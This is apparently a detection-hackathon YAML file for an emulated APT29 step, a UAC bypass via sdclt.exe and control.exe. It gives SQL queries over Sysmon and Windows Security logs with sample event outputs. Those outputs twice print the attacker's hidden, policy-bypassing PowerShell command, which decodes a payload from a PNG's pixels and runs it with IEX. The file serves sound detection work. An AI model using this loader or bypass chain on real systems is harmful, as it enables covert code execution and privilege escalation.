@@ -1,0 +1,100 @@
+vendor: OTR Community
+step: 3.B.2
+procedure: Executed elevated PowerShell payload
+criteria: High integrity powershell.exe spawning from control.exe​​ (spawned from sdclt.exe)
+technique:
+  name: Bypass User Account Control
+  id: T1088
+issue: https://github.com/OTRF/detection-hackathon-apt29/issues/6
+detections:
+  - main_type: Telemetry
+    modifier_type:
+    description: Telemetry showed control.exe creating a high integrity powershell.exe.
+    reference:
+    queries:
+      - id: 6C8780E9-E6AF-4210-8EA0-72E9017CEE7D
+        data_sources:
+          - Microsoft-Windows-Sysmon/Operational
+        rule_contribution:
+        logic: |
+          SELECT Message
+          FROM apt29Host a
+          INNER JOIN (
+              SELECT ProcessGuid
+              FROM apt29Host
+              WHERE Channel = "Microsoft-Windows-Sysmon/Operational"
+                  AND EventID = 1
+                  AND LOWER(Image) LIKE "%control.exe"
+                  AND LOWER(ParentImage) LIKE "%sdclt.exe"
+          ) b
+          ON a.ParentProcessGuid = b.ProcessGuid
+          WHERE a.Channel = "Microsoft-Windows-Sysmon/Operational"
+              AND a.EventID = 1
+              AND a.IntegrityLevel = "High"
+        output: |
+          Process Create:
+          RuleName: -
+          UtcTime: 2020-05-02 02:58:44.325
+          ProcessGuid: {47ab858c-e1e4-5eac-b803-000000000400}
+          ProcessId: 2976
+          Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+          FileVersion: 10.0.18362.1 (WinBuild.160101.0800)
+          Description: Windows PowerShell
+          Product: Microsoft® Windows® Operating System
+          Company: Microsoft Corporation
+          OriginalFileName: PowerShell.EXE
+          CommandLine: "PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
+          CurrentDirectory: C:\windows\system32\
+          User: DMEVALS\pbeesly
+          LogonGuid: {47ab858c-dabe-5eac-812e-370000000000}
+          LogonId: 0x372E81
+          TerminalSessionId: 2
+          IntegrityLevel: High
+          Hashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481
+          ParentProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}
+          ParentProcessId: 4892
+          ParentImage: C:\Windows\System32\control.exe
+          ParentCommandLine: "C:\Windows\System32\control.exe"  /name Microsoft.BackupAndRestoreCenter
+      - id: EE34D18C-0549-4AFB-8B98-01160B0C9094
+        data_sources:
+          - Security
+        rule_contribution:
+        logic: |
+          SELECT Message
+          FROM apt29Host a
+          INNER JOIN (
+              SELECT NewProcessId
+              FROM apt29Host
+              WHERE LOWER(Channel) = "security"
+                  AND EventID = 4688
+                  AND LOWER(NewProcessName) LIKE "%control.exe"
+                  AND LOWER(ParentProcessName) LIKE "%sdclt.exe"
+          ) b
+          ON a.ProcessId = b.NewProcessId
+          WHERE LOWER(a.Channel) = "security"
+              AND a.EventID = 4688
+              AND a.MandatoryLabel = "S-1-16-12288"
+              AND a.TokenElevationType = "%%1937"
+        output: |
+          A new process has been created.
+
+          Creator Subject:
+            Security ID:		S-1-5-21-1830255721-3727074217-2423397540-1107
+            Account Name:		pbeesly
+            Account Domain:		DMEVALS
+            Logon ID:		0x372E81
+          
+          Target Subject:
+            Security ID:		S-1-0-0
+            Account Name:		-
+            Account Domain:		-
+            Logon ID:		0x0
+          
+          Process Information:
+            New Process ID:		0xba0
+            New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+            Token Elevation Type:	%%1937
+            Mandatory Label:		S-1-16-12288
+            Creator Process ID:	0x131c
+            Creator Process Name:	C:\Windows\System32\control.exe
+            Process Command Line:	"PowerShell.exe" -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
